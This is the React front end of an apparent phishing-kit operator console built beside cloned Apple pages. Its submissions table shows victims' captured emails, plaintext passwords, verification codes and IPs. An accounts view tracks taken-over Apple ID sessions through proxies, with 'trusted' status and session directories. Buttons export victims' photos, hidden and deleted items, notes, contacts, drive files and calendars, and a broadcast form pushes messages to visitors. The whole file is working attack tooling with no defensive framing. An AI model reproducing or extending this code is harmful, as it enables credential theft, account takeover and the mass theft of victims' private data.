import { useEffect, useState } from "react";
import { useAdminSocket } from "./useAdminSocket";

/* Small admin dashboard: password -> live submissions -> edit / delete /
 * broadcast.  It is intentionally plain Tailwind, separate from the Apple
 * pages, so it is obvious where the template ends and your UI begins. */

function Login({ onConnect, status, error }) {
  const [password, setPassword] = useState("");
  return (
    <div className="flex min-h-screen items-center justify-center bg-[#f5f5f7] px-6">
      <form
        onSubmit={(event) => {
          event.preventDefault();
          if (password) onConnect(password);
        }}
        className="w-full max-w-[380px] rounded-[16px] bg-white p-8 shadow-[0_10px_40px_rgba(0,0,0,0.08)]"
      >
        <h1 className="text-[24px] font-semibold tracking-[-0.3px] text-[#1d1d1f]">
          Admin console
        </h1>
        <p className="mt-2 text-[14px] leading-5 text-[#6e6e73]">
          The password is checked by the Socket.IO server, not by this page.
        </p>
        <label className="mt-6 block text-[12px] font-medium uppercase tracking-[0.06em] text-[#6e6e73]">
          Password
          <input
            type="password"
            autoFocus
            value={password}
            onChange={(event) => setPassword(event.target.value)}
            className="mt-2 block h-11 w-full rounded-[10px] border border-[#d2d2d7] px-3 text-[15px] font-normal tracking-normal text-[#1d1d1f] outline-none focus:border-[#0071e3]"
          />
        </label>
        {error ? (
          <p className="mt-3 text-[13px] text-[#d70015]">{error}</p>
        ) : null}
        <button
          type="submit"
          disabled={status === "connecting" || !password}
          className="mt-5 h-11 w-full rounded-[10px] bg-[#0071e3] text-[15px] font-medium text-white disabled:opacity-50"
        >
          {status === "connecting" ? "Connecting…" : "Connect"}
        </button>
      </form>
    </div>
  );
}

function Stat({ label, value }) {
  return (
    <div className="rounded-[12px] bg-white p-4 shadow-[0_1px_3px_rgba(0,0,0,0.06)]">
      <div className="text-[11px] font-medium uppercase tracking-[0.06em] text-[#6e6e73]">
        {label}
      </div>
      <div className="mt-1 text-[26px] font-semibold text-[#1d1d1f]">{value}</div>
    </div>
  );
}

function Detail({ item, onSave, onDelete, onClose }) {
  const [note, setNote] = useState(item.note ?? "");
  return (
    <aside className="w-full rounded-[14px] bg-white p-5 shadow-[0_1px_3px_rgba(0,0,0,0.06)] lg:w-[360px]">
      <div className="flex items-start justify-between gap-3">
        <div>
          <div className="text-[11px] font-medium uppercase tracking-[0.06em] text-[#6e6e73]">
            Submission
          </div>
          <h2 className="mt-1 break-all text-[17px] font-semibold text-[#1d1d1f]">
            {item.email || "(no email)"}
          </h2>
        </div>
        <button
          type="button"
          onClick={onClose}
          className="rounded-full px-2 py-1 text-[13px] text-[#6e6e73] hover:bg-[#f5f5f7]"
        >
          Close
        </button>
      </div>

      <dl className="mt-4 grid grid-cols-[90px_1fr] gap-y-2 text-[13px] leading-5">
        <dt className="text-[#6e6e73]">Password</dt>
        <dd className="break-all font-mono text-[#1d1d1f]">{item.password || "—"}</dd>
        <dt className="text-[#6e6e73]">Code</dt>
        <dd className="font-mono text-[#1d1d1f]">{item.code || "—"}</dd>
        <dt className="text-[#6e6e73]">Page</dt>
        <dd className="text-[#1d1d1f]">{item.page}</dd>
        <dt className="text-[#6e6e73]">IP</dt>
        <dd className="break-all text-[#1d1d1f]">{item.ip || "—"}</dd>
        <dt className="text-[#6e6e73]">Country</dt>
        <dd className="text-[#1d1d1f]">
          {item.country || "—"} {item.countryCode ? `(${item.countryCode})` : ""}
        </dd>
        <dt className="text-[#6e6e73]">Created</dt>
        <dd className="text-[#1d1d1f]">{new Date(item.createdAt).toLocaleString()}</dd>
      </dl>

      <div className="mt-4">
        <div className="text-[12px] font-medium text-[#6e6e73]">Status</div>
        <div className="mt-2 flex gap-2">
          {["new", "reviewed", "done"].map((status) => (
            <button
              key={status}
              type="button"
              onClick={() => onSave(item.id, { status })}
              className={`rounded-full border px-3 py-1 text-[12px] capitalize ${
                item.status === status
                  ? "border-[#0071e3] bg-[#e8f2fd] text-[#0066cc]"
                  : "border-[#d2d2d7] text-[#424245] hover:bg-[#f5f5f7]"
              }`}
            >
              {status}
            </button>
          ))}
        </div>
      </div>

      <label className="mt-4 block text-[12px] font-medium text-[#6e6e73]">
        Note
        <textarea
          value={note}
          onChange={(event) => setNote(event.target.value)}
          rows={3}
          className="mt-1 block w-full resize-y rounded-[10px] border border-[#d2d2d7] p-2 text-[13px] font-normal text-[#1d1d1f] outline-none focus:border-[#0071e3]"
        />
      </label>
      <div className="mt-3 flex gap-2">
        <button
          type="button"
          onClick={() => onSave(item.id, { note })}
          className="h-9 flex-1 rounded-[9px] bg-[#0071e3] text-[13px] font-medium text-white"
        >
          Save note
        </button>
        <button
          type="button"
          onClick={() => onDelete(item.id)}
          className="h-9 rounded-[9px] border border-[#d2d2d7] px-3 text-[13px] text-[#d70015] hover:bg-[#fff2f2]"
        >
          Delete
        </button>
      </div>
    </aside>
  );
}

function statusLight(account) {
  if (!account) return "bg-[#d2d2d7]";
  if (["dead", "twofa", "invalid", "error"].includes(account.status)) return "bg-[#d70015]";
  if (
    ["connected", "done"].includes(account.status) &&
    account.trusted &&
    account.lastPingAt
  ) {
    return "bg-[#30a14e]";
  }
  return "bg-[#f0b429]";
}

function accountStatusText(account) {
  if (!account) return "";
  if (account.locked) {
    return `locked${account.lockCode ? ` (${account.lockCode})` : ""}`;
  }
  return `${account.status}${account.trusted ? " · trusted" : ""}`;
}

function lockedHint(account) {
  if (!account?.locked) return "";
  return account.unlockUrl || "https://iforgot.apple.com";
}

function accountStatusClass(account) {
  if (!account) return "bg-[#f5f5f7]";
  if (["dead", "twofa", "invalid", "error"].includes(account.status)) return "bg-[#fff2f2]";
  if (account.status === "connected" || account.status === "done") return "bg-[#edf8f0]";
  return "bg-[#fff8e6]";
}

function AccountDetail({ account, jobs, onPing, onExport, onClose }) {
  const [percent, setPercent] = useState(0);
  useEffect(() => {
    const total = Number(account.export?.total) || 0;
    const done = Number(account.export?.done) || 0;
    setPercent(total ? Math.round((done / total) * 100) : 0);
  }, [account.export?.done, account.export?.total]);
  const identity = account.identity || {};
  const counts = account.counts || {};
  const proxy = account.proxy || {};
  return (
    <aside className="w-full rounded-[14px] bg-white p-5 shadow-[0_1px_3px_rgba(0,0,0,0.06)] lg:w-[380px]">
      <div className="flex items-start justify-between gap-3">
        <div>
          <div className="text-[11px] font-medium uppercase tracking-[0.06em] text-[#6e6e73]">
            Account
          </div>
          <h2 className="mt-1 break-all text-[17px] font-semibold text-[#1d1d1f]">
            {account.email}
          </h2>
          <div className="mt-1 text-[12px] text-[#6e6e73]">{identity.name || "—"}</div>
        </div>
        <button
          type="button"
          onClick={onClose}
          className="rounded-full px-2 py-1 text-[13px] text-[#6e6e73] hover:bg-[#f5f5f7]"
        >
          Close
        </button>
      </div>

      <dl className="mt-4 grid grid-cols-[92px_1fr] gap-y-2 text-[13px] leading-5">
        <dt className="text-[#6e6e73]">Status</dt>
        <dd className="flex flex-wrap items-center gap-2">
          <span className={`h-2 w-2 rounded-full ${statusLight(account)}`} />
          <span className="capitalize">{accountStatusText(account)}</span>
          {account.locked ? (
            <a
              href={lockedHint(account)}
              target="_blank"
              rel="noopener"
              className="text-[11px] text-[#0066cc] underline"
            >
              unlock
            </a>
          ) : null}
        </dd>
        <dt className="text-[#6e6e73]">Password</dt>
        <dd className="break-all font-mono">{account.password || "—"}</dd>
        <dt className="text-[#6e6e73]">Plan</dt>
        <dd>{identity.plan?.featureKey || "—"}</dd>
        <dt className="text-[#6e6e73]">Storage</dt>
        <dd>
          {Number(identity.storage?.used || 0).toLocaleString()} /{" "}
          {Number(identity.storage?.total || 0).toLocaleString()} bytes
        </dd>
        <dt className="text-[#6e6e73]">Visitor</dt>
        <dd>
          {account.geo?.country || "—"} ({account.geo?.ip || "—"})
        </dd>
        <dt className="text-[#6e6e73]">Proxy</dt>
        <dd>
          {proxy.country || "—"} · exit {proxy.exitIp || "—"}
        </dd>
        <dt className="text-[#6e6e73]">Session</dt>
        <dd className="break-all font-mono text-[11px]">{account.sessionDir || "—"}</dd>
        <dt className="text-[#6e6e73]">Last ping</dt>
        <dd>{account.lastPingAt ? new Date(account.lastPingAt).toLocaleString() : "never"}</dd>
      </dl>

      <div className="mt-4 grid grid-cols-3 gap-2 text-center">
        {[
          ["Photos", counts.photos],
          ["Hidden", counts.hidden],
          ["Deleted", counts.deleted],
          ["Notes", counts.notes],
          ["Contacts", counts.contacts],
          ["Drive", counts.driveFiles],
          ["Reminders", counts.reminders],
          ["Calendars", counts.calendars],
          ["Albums", counts.albums],
        ].map(([label, value]) => (
          <div key={label} className="rounded-[9px] bg-[#f5f5f7] p-2">
            <div className="text-[15px] font-semibold">{Number(value) || 0}</div>
            <div className="text-[10px] uppercase tracking-[0.04em] text-[#6e6e73]">{label}</div>
          </div>
        ))}
      </div>

      <div className="mt-4">
        <div className="flex items-center justify-between text-[12px] text-[#6e6e73]">
          <span>Export · {account.export?.phase || "idle"}</span>
          <span>{percent}%</span>
        </div>
        <div className="mt-1 h-1.5 overflow-hidden rounded-full bg-[#e8e8ed]">
          <div className="h-full bg-[#0071e3]" style={{ width: `${percent}%` }} />
        </div>
        <div className="mt-1 text-[11px] text-[#6e6e73]">
          {account.export?.done || 0}/{account.export?.total || 0} items ·{" "}
          {Number(account.export?.bytes || 0).toLocaleString()} bytes
        </div>
      </div>

      {jobs?.length ? (
        <div className="mt-4">
          <div className="text-[12px] font-medium text-[#6e6e73]">Recent jobs</div>
          <ul className="mt-1 space-y-0.5 font-mono text-[10px] leading-4 text-[#6e6e73]">
            {jobs.slice(0, 5).map((job) => (
              <li key={job.id}>
                {job.type} · {job.status} · {new Date(job.createdAt).toLocaleTimeString()}
              </li>
            ))}
          </ul>
        </div>
      ) : null}

      <div className="mt-4 flex flex-wrap gap-2">
        <button
          type="button"
          onClick={() => onPing(account.id)}
          className="h-9 rounded-[9px] border border-[#d2d2d7] px-3 text-[12px] hover:bg-[#fafafa]"
        >
          Ping
        </button>
        <button
          type="button"
          onClick={() => onExport(account.id, "missing")}
          className="h-9 rounded-[9px] bg-[#0071e3] px-3 text-[12px] font-medium text-white"
        >
          Export missing
        </button>
        <button
          type="button"
          onClick={() => onExport(account.id, "force")}
          className="h-9 rounded-[9px] border border-[#d2d2d7] px-3 text-[12px] hover:bg-[#fafafa]"
        >
          Redownload
        </button>
      </div>
      {account.lastError ? (
        <p className="mt-3 break-words text-[11px] text-[#d70015]">{account.lastError}</p>
      ) : null}
    </aside>
  );
}

function AccountsSection({ admin }) {
  const {
    state,
    loadAccounts,
    openAccount,
    clearAccount,
    pingAccount,
    exportAccount,
    refreshAll,
  } = admin;
  const [query, setQuery] = useState("");
  return (
    <div className="mt-5 flex flex-col gap-5 lg:flex-row">
      <section className="min-w-0 flex-1 rounded-[14px] bg-white p-5 shadow-[0_1px_3px_rgba(0,0,0,0.06)]">
        <form
          onSubmit={(event) => {
            event.preventDefault();
            loadAccounts(1, query);
          }}
          className="flex gap-2"
        >
          <input
            value={query}
            onChange={(event) => setQuery(event.target.value)}
            placeholder="Search email, name, status…"
            className="h-9 flex-1 rounded-[9px] border border-[#d2d2d7] px-3 text-[13px] outline-none focus:border-[#0071e3]"
          />
          <button
            type="submit"
            className="h-9 rounded-[9px] bg-[#1d1d1f] px-3 text-[13px] font-medium text-white"
          >
            Search
          </button>
        </form>

        <div className="mt-4 overflow-x-auto">
          <table className="w-full min-w-[620px] border-collapse text-left text-[13px]">
            <thead>
              <tr className="border-b border-[#e8e8ed] text-[11px] uppercase tracking-[0.05em] text-[#6e6e73]">
                <th className="py-2 pr-3 font-medium">Status</th>
                <th className="py-2 pr-3 font-medium">Account</th>
                <th className="py-2 pr-3 font-medium">Country</th>
                <th className="py-2 pr-3 font-medium">Proxy exit</th>
                <th className="py-2 pr-3 font-medium">Trusted</th>
                <th className="py-2 font-medium">Updated</th>
              </tr>
            </thead>
            <tbody>
              {state.accounts.map((account) => (
                <tr
                  key={account.id}
                  onClick={() => openAccount(account.id)}
                  className="cursor-pointer border-b border-[#f0f0f2] hover:bg-[#fafafa]"
                >
                  <td className="py-2.5 pr-3">
                    <span className="flex items-center gap-2">
                      <span className={`h-2 w-2 rounded-full ${statusLight(account)}`} />
                      <span className={account.locked ? "font-medium capitalize text-[#d70015]" : "capitalize"}>
                        {account.locked ? "locked" : account.status}
                      </span>
                    </span>
                    {account.locked ? (
                      <span className="block text-[10px] text-[#6e6e73]">
                        {account.lockCode || "-20209"}
                      </span>
                    ) : null}
                  </td>
                  <td className="max-w-[240px] truncate py-2.5 pr-3">
                    {account.email}
                    {account.identity?.name ? (
                      <span className="block text-[11px] text-[#6e6e73]">{account.identity.name}</span>
                    ) : null}
                  </td>
                  <td className="py-2.5 pr-3">{account.geo?.country || "—"}</td>
                  <td className="py-2.5 pr-3 font-mono text-[11px]">
                    {account.proxy?.exitIp || "—"}
                  </td>
                  <td className="py-2.5 pr-3">{account.trusted ? "yes" : "no"}</td>
                  <td className="py-2.5 text-[12px] text-[#6e6e73]">
                    {new Date(account.updatedAt).toLocaleString()}
                  </td>
                </tr>
              ))}
              {state.accounts.length === 0 ? (
                <tr>
                  <td colSpan={6} className="py-8 text-center text-[13px] text-[#6e6e73]">
                    No accounts yet.
                  </td>
                </tr>
              ) : null}
            </tbody>
          </table>
        </div>

        <div className="mt-4 flex items-center justify-between text-[13px] text-[#6e6e73]">
          <span>
            {state.accountsTotal} total · page {state.accountPage} / {state.accountPages}
          </span>
          <div className="flex gap-2">
            <button
              type="button"
              disabled={state.accountPage <= 1}
              onClick={() => loadAccounts(state.accountPage - 1, state.accountsQuery)}
              className="h-8 rounded-[8px] border border-[#d2d2d7] px-3 disabled:opacity-40"
            >
              Prev
            </button>
            <button
              type="button"
              disabled={state.accountPage >= state.accountPages}
              onClick={() => loadAccounts(state.accountPage + 1, state.accountsQuery)}
              className="h-8 rounded-[8px] border border-[#d2d2d7] px-3 disabled:opacity-40"
            >
              Next
            </button>
            <button
              type="button"
              onClick={refreshAll}
              className="h-8 rounded-[8px] border border-[#d2d2d7] px-3"
            >
              Refresh
            </button>
          </div>
        </div>
      </section>

      {state.selectedAccount ? (
        <AccountDetail
          key={state.selectedAccount.id}
          account={state.selectedAccount}
          jobs={state.accountJobs}
          onPing={pingAccount}
          onExport={exportAccount}
          onClose={clearAccount}
        />
      ) : (
        <aside className="w-full space-y-4 lg:w-[380px]">
          <div className="rounded-[14px] bg-white p-5 shadow-[0_1px_3px_rgba(0,0,0,0.06)]">
            <h2 className="text-[15px] font-semibold">Workers</h2>
            <div className="mt-3 grid grid-cols-3 gap-2 text-center">
              <div className="rounded-[9px] bg-[#f5f5f7] p-2">
                <div className="text-[16px] font-semibold">{state.workers?.workers ?? 0}</div>
                <div className="text-[10px] uppercase tracking-[0.04em] text-[#6e6e73]">
                  workers
                </div>
              </div>
              <div className="rounded-[9px] bg-[#f5f5f7] p-2">
                <div className="text-[16px] font-semibold">{state.workers?.auth ?? 0}</div>
                <div className="text-[10px] uppercase tracking-[0.04em] text-[#6e6e73]">
                  auth slots
                </div>
              </div>
              <div className="rounded-[9px] bg-[#f5f5f7] p-2">
                <div className="text-[16px] font-semibold">{state.workers?.export ?? 0}</div>
                <div className="text-[10px] uppercase tracking-[0.04em] text-[#6e6e73]">
                  export slots
                </div>
              </div>
            </div>
          </div>
          <div className="rounded-[14px] bg-white p-5 shadow-[0_1px_3px_rgba(0,0,0,0.06)]">
            <h2 className="text-[15px] font-semibold">Activity</h2>
            <ul className="mt-2 space-y-1 font-mono text-[11px] leading-4 text-[#6e6e73]">
              {state.log.map((line, index) => (
                <li key={index}>{line}</li>
              ))}
            </ul>
          </div>
        </aside>
      )}
    </div>
  );
}

function Panel({ admin }) {
  const {
    state,
    disconnect,
    loadPage,
    loadAccounts,
    refreshAll,
    openItem,
    clearSelected,
    saveItem,
    deleteItem,
    sendNotice,
  } = admin;
  const [tab, setTab] = useState("accounts");
  const [query, setQuery] = useState("");
  const [notice, setNotice] = useState({ title: "", body: "" });

  return (
    <div className="min-h-screen bg-[#f5f5f7] p-5 text-[#1d1d1f] lg:p-8">
      <header className="flex flex-wrap items-center justify-between gap-3">
        <div className="flex items-center gap-3">
          <span
            className={`h-2.5 w-2.5 rounded-full ${
              state.status === "online" ? "bg-[#30a14e]" : "bg-[#d70015]"
            }`}
          />
          <h1 className="text-[22px] font-semibold tracking-[-0.3px]">Admin console</h1>
          <span className="text-[12px] text-[#6e6e73]">{state.status}</span>
        </div>
        <div className="flex gap-2">
          <button
            type="button"
            onClick={() =>
              tab === "accounts"
                ? refreshAll()
                : loadPage(state.page, state.query)
            }
            className="h-9 rounded-[9px] border border-[#d2d2d7] bg-white px-3 text-[13px] hover:bg-[#fafafa]"
          >
            Refresh
          </button>
          <button
            type="button"
            onClick={disconnect}
            className="h-9 rounded-[9px] border border-[#d2d2d7] bg-white px-3 text-[13px] hover:bg-[#fafafa]"
          >
            Disconnect
          </button>
        </div>
      </header>

      <div className="mt-4 flex gap-2">
        <button
          type="button"
          onClick={() => setTab("accounts")}
          className={`h-8 rounded-full px-4 text-[12px] font-medium ${
            tab === "accounts"
              ? "bg-[#1d1d1f] text-white"
              : "border border-[#d2d2d7] bg-white text-[#424245]"
          }`}
        >
          Accounts
        </button>
        <button
          type="button"
          onClick={() => setTab("submissions")}
          className={`h-8 rounded-full px-4 text-[12px] font-medium ${
            tab === "submissions"
              ? "bg-[#1d1d1f] text-white"
              : "border border-[#d2d2d7] bg-white text-[#424245]"
          }`}
        >
          Submissions
        </button>
      </div>

      <div className="mt-4 grid grid-cols-2 gap-3 sm:grid-cols-4 xl:grid-cols-6">
        {tab === "accounts" ? (
          <>
            <Stat label="Accounts" value={state.accountStats?.total ?? 0} />
            <Stat label="Connected" value={state.accountStats?.byStatus?.connected ?? 0} />
            <Stat label="2FA" value={state.accountStats?.byStatus?.twofa ?? 0} />
            <Stat label="Exporting" value={state.accountStats?.byStatus?.exporting ?? 0} />
            <Stat label="Trusted" value={state.accountStats?.trusted ?? 0} />
            <Stat label="Workers" value={state.workers?.workers ?? 0} />
          </>
        ) : (
          <>
            <Stat label="Total" value={state.stats?.total ?? 0} />
            <Stat label="New" value={state.stats?.byStatus?.new ?? 0} />
            <Stat label="Reviewed" value={state.stats?.byStatus?.reviewed ?? 0} />
            <Stat label="Done" value={state.stats?.byStatus?.done ?? 0} />
          </>
        )}
      </div>

      {tab === "accounts" ? (
        <AccountsSection admin={admin} />
      ) : (
      <div className="mt-5 flex flex-col gap-5 lg:flex-row">
        <section className="min-w-0 flex-1 rounded-[14px] bg-white p-5 shadow-[0_1px_3px_rgba(0,0,0,0.06)]">
          <form
            onSubmit={(event) => {
              event.preventDefault();
              loadPage(1, query);
            }}
            className="flex gap-2"
          >
            <input
              value={query}
              onChange={(event) => setQuery(event.target.value)}
              placeholder="Search email, code, country…"
              className="h-9 flex-1 rounded-[9px] border border-[#d2d2d7] px-3 text-[13px] outline-none focus:border-[#0071e3]"
            />
            <button
              type="submit"
              className="h-9 rounded-[9px] bg-[#1d1d1f] px-3 text-[13px] font-medium text-white"
            >
              Search
            </button>
          </form>

          <div className="mt-4 overflow-x-auto">
            <table className="w-full min-w-[560px] border-collapse text-left text-[13px]">
              <thead>
                <tr className="border-b border-[#e8e8ed] text-[11px] uppercase tracking-[0.05em] text-[#6e6e73]">
                  <th className="py-2 pr-3 font-medium">Email</th>
                  <th className="py-2 pr-3 font-medium">Code</th>
                  <th className="py-2 pr-3 font-medium">Country</th>
                  <th className="py-2 pr-3 font-medium">Status</th>
                  <th className="py-2 font-medium">Created</th>
                </tr>
              </thead>
              <tbody>
                {state.items.map((item) => (
                  <tr
                    key={item.id}
                    onClick={() => openItem(item.id)}
                    className="cursor-pointer border-b border-[#f0f0f2] hover:bg-[#fafafa]"
                  >
                    <td className="max-w-[220px] truncate py-2.5 pr-3">{item.email || "—"}</td>
                    <td className="py-2.5 pr-3 font-mono text-[12px]">{item.code || "—"}</td>
                    <td className="py-2.5 pr-3">{item.country || "—"}</td>
                    <td className="py-2.5 pr-3">
                      <span className="rounded-full bg-[#f5f5f7] px-2 py-0.5 text-[11px] capitalize">
                        {item.status}
                      </span>
                    </td>
                    <td className="py-2.5 text-[12px] text-[#6e6e73]">
                      {new Date(item.createdAt).toLocaleString()}
                    </td>
                  </tr>
                ))}
                {state.items.length === 0 ? (
                  <tr>
                    <td colSpan={5} className="py-8 text-center text-[13px] text-[#6e6e73]">
                      No submissions.
                    </td>
                  </tr>
                ) : null}
              </tbody>
            </table>
          </div>

          <div className="mt-4 flex items-center justify-between text-[13px] text-[#6e6e73]">
            <span>
              {state.total} total · page {state.page} / {state.pages}
            </span>
            <div className="flex gap-2">
              <button
                type="button"
                disabled={state.page <= 1}
                onClick={() => loadPage(state.page - 1, state.query)}
                className="h-8 rounded-[8px] border border-[#d2d2d7] px-3 disabled:opacity-40"
              >
                Prev
              </button>
              <button
                type="button"
                disabled={state.page >= state.pages}
                onClick={() => loadPage(state.page + 1, state.query)}
                className="h-8 rounded-[8px] border border-[#d2d2d7] px-3 disabled:opacity-40"
              >
                Next
              </button>
            </div>
          </div>
        </section>

        {state.selected ? (
          <Detail
            key={state.selected.id}
            item={state.selected}
            onSave={saveItem}
            onDelete={deleteItem}
            onClose={clearSelected}
          />
        ) : (
          <aside className="w-full space-y-4 lg:w-[360px]">
            <div className="rounded-[14px] bg-white p-5 shadow-[0_1px_3px_rgba(0,0,0,0.06)]">
              <h2 className="text-[15px] font-semibold">Broadcast to visitors</h2>
              <form
                onSubmit={(event) => {
                  event.preventDefault();
                  sendNotice(notice.title, notice.body);
                  setNotice({ title: "", body: "" });
                }}
                className="mt-3 space-y-2"
              >
                <input
                  value={notice.title}
                  onChange={(event) => setNotice((n) => ({ ...n, title: event.target.value }))}
                  placeholder="Title"
                  className="h-9 w-full rounded-[9px] border border-[#d2d2d7] px-3 text-[13px] outline-none focus:border-[#0071e3]"
                />
                <textarea
                  value={notice.body}
                  onChange={(event) => setNotice((n) => ({ ...n, body: event.target.value }))}
                  placeholder="Optional message"
                  rows={2}
                  className="w-full rounded-[9px] border border-[#d2d2d7] p-2 text-[13px] outline-none focus:border-[#0071e3]"
                />
                <button
                  type="submit"
                  disabled={!notice.title}
                  className="h-9 w-full rounded-[9px] bg-[#0071e3] text-[13px] font-medium text-white disabled:opacity-50"
                >
                  Send notice
                </button>
              </form>
            </div>

            <div className="rounded-[14px] bg-white p-5 shadow-[0_1px_3px_rgba(0,0,0,0.06)]">
              <h2 className="text-[15px] font-semibold">Activity</h2>
              <ul className="mt-2 space-y-1 font-mono text-[11px] leading-4 text-[#6e6e73]">
                {state.log.map((line, index) => (
                  <li key={index}>{line}</li>
                ))}
              </ul>
            </div>
          </aside>
        )}
      </div>
      )}
    </div>
  );
}

export default function Admin() {
  const admin = useAdminSocket();
  if (admin.state.status === "idle") {
    return (
      <Login
        onConnect={admin.connect}
        status={admin.state.status}
        error={admin.state.error}
      />
    );
  }
  if (admin.state.status === "error") {
    return (
      <Login
        onConnect={admin.connect}
        status={admin.state.status}
        error="Wrong password, or the Socket.IO server is not running."
      />
    );
  }
  return <Panel admin={admin} />;
}
